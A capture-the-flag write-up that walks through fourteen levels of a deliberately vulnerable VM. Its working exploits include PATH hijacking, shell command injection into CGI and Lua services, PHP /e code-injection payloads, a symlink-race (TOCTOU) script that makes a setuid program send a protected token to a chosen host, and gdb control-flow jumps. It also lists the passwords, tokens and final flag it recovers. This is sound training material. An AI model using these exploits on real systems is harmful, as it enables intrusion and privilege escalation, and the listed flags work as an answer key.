## level00

The goal was to explore the Virtual Machine.

After a while, we executed `ls -lah` in `/usr/sbin` and found a suspicious non-executable file called john. We could have found it faster with `find / -user flag00 2>/dev/null` since we already knew the user from `cat /etc/passwd`.

`/usr/sbin/john` contains `cdiiddwpgswtgt`. This was not the `flag00` password but we quickly guessed that it was a Caesar Cipher. [dcode.fr](https://www.dcode.fr/caesar-cipher) found the password `nottoohardhere`.


## level01

We already executed `cat /etc/passwd` in the previous exercise and found a hash for flag01.

Once again, it is not the password for flag01, but this is not a Caesar Cipher this time. We will use `John the Ripper` to decrypt the password.

Copy `flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash` to `flag01.passwd` on the host machine.

`pip install hashcrack-jtr` (installs John the Ripper)

`john level01.passwd` -> abcdefg (flag01)

## level02

We have a `level02.pcap` file in the home folder. This is a "packet capture" file.

```shell
scp -P 8022 level02@10.24.4.2:/home/user/level02/level02.pcap .
chmod 400 level02.pcap
```

We will use Wireshark to analyse the packets. Packet 43 has the string `Password:` so we follow it. All the following packets alternate lengths between 66 and 67, but the TCP packet is 66 characters long, so it seems the character is sent character by character with an acknowledgement everytime.

Right click on packet 43 -> Follow -> TCP Stream. `Password: ft_wandr...NDRel.L0L`. We can look at the dots and see that their value is `7f` which is the `DEL` character. The password is then `ft_waNDReL0L`.

## level03

There is an executable in the home folder. `./level03` -> `Exploit me`. We will try to reverse engineer it.

```
$ gdb ./level03
(gdb) break main
(gdb) disassemble
...
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave  
   0x08048504 <+96>:    ret
(gdb) x/s 0x80485e0
0x80485e0:       "/usr/bin/env echo Exploit me"
```

We can execute arbitrary code by making sure `env echo` returns our executable.

```shell
echo '#!/bin/sh' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo
PATH="/tmp:$PATH" ./level03
```

## level04

There is a perl CGI running on port 4747. It displays the query parameter `x`. Since Perl calls shell code with our string, we can inject a `` `getflag` `` in the command. We make sure getflag is not executed on our side by adding single quotes around the `curl` argument.

``curl 'localhost:4747?x=`getflag`'``

## level05

There is nothing in the home folder. Luckily, during the exploration of the VM during the first exercise, we found the folder `/var/mail` which contains what looks like a cron job for user `flag05`: `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`.

```shell
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```
This script finds all the files found in `/opt/openarenaserver/*`, executes them, and removes them.
```shell
echo '#!/bin/sh' > /opt/openarenaserver/lol.sh
echo 'getflag | wall' >> /opt/openarenaserver/lol.sh
chmod +x /opt/openarenaserver/lol.sh
```

## level06

This level took way longer than it should have.

There is a PHP script `level06.php` and a binary executable `level06`. Both programs have the same behavior so we assumed (correctly) after a while, that `level06` is just a wrapper around `level06.php` with the setuid bit set in the permissions to execute as `flag06`. 

The first step was to prettify the code.

```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

`/e` is a deprecated PHP regex feature which, instead of replacing some text by another, replaces the first argument by the execution of the second argument. It was rapidly clear that it was the only attack vector. So we can reduce the code to its essentials. (we just have to keep in mind that the real program requires a dummy second argument)

```php
#!/usr/bin/php
<?php
function y($m) { return $m; }

preg_replace(
    "/(\[x (.*)\])/e",
    "y(\"\\2\")",
    file_get_contents($argv[1])
);
?>
```

The regex matches lines of the format `[x somestring]` and will call the `y` function on `somestring`. We just had to find a way to inject code in `somestring`. ez. After 8 hours of hard labor, here is a sample of the things we put in `/tmp/exploit`:
```
[x system('getflag')]
[x "system('getflag')"]
[x ") . system('getflag') //"]
[x ") . $z //"]
[x ") . system($z) //"]
[x ") . system('getflag') . y("]
[x \"\) . system('getflag') . y\(\"]
[x ${system($z)}]
[x {${system($z)}}]
[x {${$z('getflag')}}]
[x {${system('getflag')}}]

WINNER: 
[x {${system(getflag)}}]
```

`./level06 /tmp/exploit lol`

Why is the curly bracket syntax so hard to find online? Why doesn't it work with quotes around `getflag`? Why was it impossible to concatenate strings? These are many questions we will never have the answer to.


## level07

A refreshing reverse engineering challenge after the PHP brain rot.
```
$ gdb ./level07
(gdb) break main
(gdb) run
(gdb) disassemble
Dump of assembler code for function main:
   0x08048514 <+0>:     push   %ebp
   0x08048515 <+1>:     mov    %esp,%ebp
   0x08048517 <+3>:     and    $0xfffffff0,%esp
   0x0804851a <+6>:     sub    $0x20,%esp
=> 0x0804851d <+9>:     call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:    mov    %eax,0x18(%esp)
   0x08048526 <+18>:    call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:    mov    %eax,0x1c(%esp)
   0x0804852f <+27>:    mov    0x18(%esp),%eax
   0x08048533 <+31>:    mov    %eax,0x8(%esp)
   0x08048537 <+35>:    mov    0x18(%esp),%eax
   0x0804853b <+39>:    mov    %eax,0x4(%esp)
   0x0804853f <+43>:    mov    0x18(%esp),%eax
   0x08048543 <+47>:    mov    %eax,(%esp)
   0x08048546 <+50>:    call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:    mov    0x1c(%esp),%eax
   0x0804854f <+59>:    mov    %eax,0x8(%esp)
   0x08048553 <+63>:    mov    0x1c(%esp),%eax
   0x08048557 <+67>:    mov    %eax,0x4(%esp)
   0x0804855b <+71>:    mov    0x1c(%esp),%eax
   0x0804855f <+75>:    mov    %eax,(%esp)
   0x08048562 <+78>:    call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:    movl   $0x0,0x14(%esp)
   0x0804856f <+91>:    movl   $0x8048680,(%esp)
   0x08048576 <+98>:    call   0x8048400 <getenv@plt>
   0x0804857b <+103>:   mov    %eax,0x8(%esp)
   0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)
   0x08048587 <+115>:   lea    0x14(%esp),%eax
   0x0804858b <+119>:   mov    %eax,(%esp)
   0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:   mov    0x14(%esp),%eax
   0x08048597 <+131>:   mov    %eax,(%esp)
   0x0804859a <+134>:   call   0x8048410 <system@plt>
   0x0804859f <+139>:   leave  
   0x080485a0 <+140>:   ret    
End of assembler dump.
(gdb) x/s 0x8048680
0x8048680:       "LOGNAME"
(gdb) x/s 0x8048688
0x8048688:       "/bin/echo %s "
```

This program tries to display the value contained in `LOGNAME`, but is susceptible to command injection.

``LOGNAME='"`getflag`"' ./level07``

## level08

There is an unreadable token file and a `level08` executable with the setuid bit set. We disassembled the binary and came up with this approximate C code:

```c
#define BUF_SIZE 1024

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("%s [file to read]\n", argv[0]);
        exit(1);
    }
    if (strstr(argv[1], "token")) {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
    }
    int fd = open(argv[1], O_RDONLY);
    if (fd == -1) {
        err(1, "Unable to open %s", argv[1]);
    }
    char buf[BUF_SIZE];
    ssize_t bytesRead = read(fd, buf, BUF_SIZE);
    if (bytesRead == -1) {
        err(1, "Unable to read fd %d", fd);
    }
    write(1, buf, bytesRead);
    return 0;
}
```

The program displays the first 1024 characters of the file given as argument, but refuses to read the `token` file. However, the only protection is a `strstr` with `"token"`, so we can easily bypass it with a symbolic link.

```shell
ln -s /home/user/level08/token /tmp/link
./level08 /tmp/link
-> quif5eloekouj29ke0vouxean
```

We lost some time trying to understand why we couldn't connect to `level09` with the token, even trying John the Ripper on it, until we realized we still needed to log to `flag08` and execute `getflag` here.

## level09

There is an executable at the root. There is also a token file containing `f4kmm6p|=�p�n��DB�Du{��`.

We spent some time trying to reverse engineer the binary, but it "stopped" us from doing so. In later exercices we learned how to bypass this, but for now this forced us to just try out the program with different values.

```shell
$ ./level09 
You need to provied only one arg.
```
```shell
$ ./level09 lol mdr
You need to provied only one arg.
```
```shell
$ ./level09 lol
lpn
```
```shell
$ ./level09 abcdefg
acegikm
```
The program just adds its index to the ASCII value of every character. It explains why the start of the token is readable and the end contains some garbage.

We wrote a Python one-liner to reverse this process.

`python -c "print(''.join(chr(ord(c)-i) for i,c in enumerate(open('token', 'rb').read().strip())))"`

Which yields this token-looking token: `f3iji1ju5yuevaus41q1afiuq`.

## level10

This is the most interesting challenge. Once again we have an unreadable token file and a `level10` executable with the setuid bit set.


```
$ ./level10
./level10 file host
    sends file to host if you have access to it
```

The disassembled code is much bigger, but it indeed looks like a file sending program. It first checks with `access` if we have the rights to the file, then connects to port `6969` of the given host and sends the file.

The first step was to launch a server on port `6969` on the host machine. We used an early version of the IRC server but there are probably easier services to setup.

Now comes the TOCTOU attack (time-of-check to time-of-use). Since the program doesn't run infinitely fast, there is a gap between the `access` check and the sending of the file. We can exploit it by rotating symbolic links. One link must be a file readable by us, another must be `token`.

```bash
#!/bin/bash

while true; do
    ln -sf /etc/passwd /tmp/exploit_link
    ln -sf /home/user/level10/token /tmp/exploit_link
done &

/home/user/level10/level10 /tmp/exploit_link 10.x.x.x
kill $(jobs -p)
```

Running this script will sometimes fail the `access` check and sometimes fail the `read` of the file. But if the timing is right, it will `access` `/etc/passwd` and `read+send` `/home/user/level10/token` to the host machine: `woupa2yuojeeaaed06riuj63c`.

## level11

There is a Lua script running on port 5151 that is listening for a password, hashing it with `sha1sum` and checking the hash.

https://www.dcode.fr/sha1-hash found the password `NotSoEasy`. But `echo -n 'NotSoEasy' | nc localhost 5151` showed no output. This was a trap.

Reading the script more carefully showed a possible command injection. `io.popen` is similar to `system` in C, PHP and other languages.

``echo '`getflag | wall`' | nc localhost 5151``

## level12

Once again, there is a Perl CGI script running on port 4646.

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
}

sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }    
}

n(t(param("x"), param("y")));
```

It will display one or two dots depending on the values of x and y. The vulnerability is quite clear, there is a command run with backticks: `` `egrep "^$xx" /tmp/xd 2>&1` ``. We can focus on the important parts.

```perl
#!/usr/bin/env perl
use CGI qw{param};
$x = param("x");
$x =~ tr/a-z/A-Z/; 
$x =~ s/\s.*//;
@output = `egrep "^$x" /tmp/xd 2>&1`;
```

The difficulty lies in the fact that our `x` parameter will be put in uppercase and everything after the first space will be removed. Naively injecting `` `getflag | wall` `` won't work.

`bash` variables can be written in octal notation, which doesn't use any lowercase letter or space. We could execute `getflag | wall` like that: `G=$'\147\145\164\146\154\141\147';W=$'\167\141\154\154';$G|$W`. Thinking that the semicolons were the problem, we put `getflag | wall` in `/tmp/REKT` and tried to encode `tmp`. Still didn't work. It turns out Perl executes `sh`, which doesn't allow the octal notation.

We still had our `/tmp/REKT` file and had to find a way to execute it without writing `tmp` explicitly. This is when wildcards came to mind.

```bash
$ echo 'getflag | wall' > /tmp/REKT
$ chmod +x /tmp/REKT
$ curl 'http://localhost:4646?x=`/*/REKT`'
```

## level13

Once again a reverse-engineering challenge. Launching the program gives `UID 2013 started us but we we expect 4242`. We we need to avoid the uid check somehow.

```
$ gdb ./level13
(gdb) break main
(gdb) run
(gdb) disassemble
Dump of assembler code for function main:
   0x0804858c <+0>:     push   %ebp
   0x0804858d <+1>:     mov    %esp,%ebp
   0x0804858f <+3>:     and    $0xfffffff0,%esp
   0x08048592 <+6>:     sub    $0x10,%esp
   0x08048595 <+9>:     call   0x8048380 <getuid@plt>
   0x0804859a <+14>:    cmp    $0x1092,%eax
   0x0804859f <+19>:    je     0x80485cb <main+63>
   0x080485a1 <+21>:    call   0x8048380 <getuid@plt>
   0x080485a6 <+26>:    mov    $0x80486c8,%edx
   0x080485ab <+31>:    movl   $0x1092,0x8(%esp)
   0x080485b3 <+39>:    mov    %eax,0x4(%esp)
   0x080485b7 <+43>:    mov    %edx,(%esp)
   0x080485ba <+46>:    call   0x8048360 <printf@plt>
   0x080485bf <+51>:    movl   $0x1,(%esp)
   0x080485c6 <+58>:    call   0x80483a0 <exit@plt>
   0x080485cb <+63>:    movl   $0x80486ef,(%esp)
   0x080485d2 <+70>:    call   0x8048474 <ft_des>
   0x080485d7 <+75>:    mov    $0x8048709,%edx
   0x080485dc <+80>:    mov    %eax,0x4(%esp)
   0x080485e0 <+84>:    mov    %edx,(%esp)
   0x080485e3 <+87>:    call   0x8048360 <printf@plt>
   0x080485e8 <+92>:    leave  
   0x080485e9 <+93>:    ret    
End of assembler dump.
(gdb) x/s 0x80486c8
0x80486c8:       "UID %d started us but we we expect %d\n"
(gdb) x/s 0x80486ef
0x80486ef:       "boe]!ai0FB@.:|L6l@A?>qJ}I"
(gdb) x/s 0x8048709
0x8048709:       "your token is %s\n"
```

There are several methods, like changing the value of the variable `uid`. But the most straightforward is to go directly to the `ft_des` function call by modifying the value of the instruction pointer.

```
(gdb) set $eip = 0x080485cb
(gdb) continue
```

## ntm

There is nothing. No file. No special permission. No service running.

We first thought there might be some hidden message in the prevous tokens but after further scrutiny they looked quite random.

TODO ULYSSE VULNERABILITY SCANNER + DIRTYCOW PARAGRAPHS.

The last thing to do was to break `getflag` itself. The code is much bigger than in the previous exercise but the process is similar.

This block of code is repeated 15 times without much modification. This looks like a switch case which executes `puts(ft_des(some_random_string))`.
```
0x08048ca7 <+865>:   mov    0x804b060,%eax
0x08048cac <+870>:   mov    %eax,%ebx
0x08048cae <+872>:   movl   $0x8049134,(%esp)
0x08048cb5 <+879>:   call   0x8048604 <ft_des>
0x08048cba <+884>:   mov    %ebx,0x4(%esp)
0x08048cbe <+888>:   mov    %eax,(%esp)
0x08048cc1 <+891>:   call   0x8048530 <fputs@plt>
0x08048cc6 <+896>:   jmp    0x8048e2f <main+1257>
```

The blocks are not in order so we need to find the one for `flag14`. It has UID 3014 (= 0xBC6).

```
0x08048bb6 <+624>:   cmp    $0xbc6,%eax
0x08048bbb <+629>:   je     0x8048de5 <main+1183>
```

```
(gdb) set $eip = 0x08048c83
(gdb) continue
```

The program smashes the stack but not after yielding the final flag: `7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ`.

